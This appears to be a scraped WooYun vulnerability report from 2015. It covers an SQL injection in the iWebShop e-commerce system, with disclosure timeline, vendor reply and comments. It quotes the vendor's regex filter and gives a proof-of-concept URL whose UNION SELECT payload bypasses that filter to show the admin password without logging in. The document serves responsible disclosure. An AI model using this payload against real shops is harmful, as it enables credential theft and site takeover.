{"id": 69358, "wybug_id": "wooyun-2015-0127392", "wybug_title": "iwebshop 直接回显管理员密码（无需登录）", "wybug_corp": "www.jooyea.cn", "wybug_author": "menmen519", "wybug_date": "2015-07-20 11:17", "wybug_open_date": "2015-10-21 07:02", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-26：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-09-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-21：\t细节向公众公开  简要描述： iwebshop 直接回显管理员密码 详细说明：  下载最新版本的代码七月十五号的漏洞参考 WooYun: Iwebshop 最新版SQL注入漏洞 发现对方做了补救措施，添加了过滤机制代码变更为:\npublic static function act($str,$type = 'string',$limitLen = false)\t{\t\tif(is_array($str))\t\t{\t\t\t$resultStr = array();\t\t\tforeach($str as $key => $val)\t\t\t{\t\t\t\t$key = self::act($key, $type, $limitLen);\t\t\t\t$val = self::act($val, $type, $limitLen);\t\t\t\t$resultStr[$key] = $val;\t\t\t}\t\t\treturn $resultStr;\t\t}\t\telse\t\t{\t\t\tswitch($type)\t\t\t{\t\t\t\tcase \"int\":\t\t\t\t\treturn intval($str);\t\t\t\t\tbreak;\t\t\t\tcase \"float\":\t\t\t\t\treturn floatval($str);\t\t\t\t\tbreak;\t\t\t\tcase \"text\":\t\t\t\t\treturn self::text($str,$limitLen);\t\t\t\t\tbreak;\t\t\t\tcase \"bool\":\t\t\t\t\treturn (bool)$str;\t\t\t\t\tbreak;\t\t\t\tcase \"url\":\t\t\t\t\treturn self::clearUrl($str);\t\t\t\t\tbreak;\t\t\t\tcase \"filename\":\t\t\t\t\treturn self::fileName($str);\t\t\t\t\tbreak;\t\t\t\tcase \"strict\":\t\t\t\t\treturn self::strict($str);\n比上一个版本多了一个return self::strict($str)用来过滤sql注入，跟进去看看代码\npublic static function strict($string)\t{\t\tif(preg_match(\"|^[\\w\\.\\s\\-<>=\\!\\x{4e00}-\\x{9fa5}]+$|u\",$string) == true)\t\t{\t\t\treturn $string;\t\t}\t\treturn '';\t}\n过滤了括号，注释可以用--怎么直接回显呢，一般来说iwebshop 数据库里面肯定是有用户的，为了测试期间我们随便注册一个用户，然后退出，url:http://localhost/iwebshop/index.php?controller=block&action=filter_userpostdata:search[1 union select password from admin order by 1 limit 1 -- ]=x这里都不需要知道表前缀，因为这个系统会对表自动添加前缀 直接用admin就好\n\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-07-23 07:01 厂商回复： 表前缀还是需要的 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-20 11:23 |    \t\tTon7BrEak \t\t\t( 普通白帽子  |\t\t\t        Rank:229 漏洞数:46        | 吃苦耐劳，我只会第一个！)\t\t \n  这个···    \n     2015-10-28 15:00 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:26        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  绕过得好哇,不带'    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}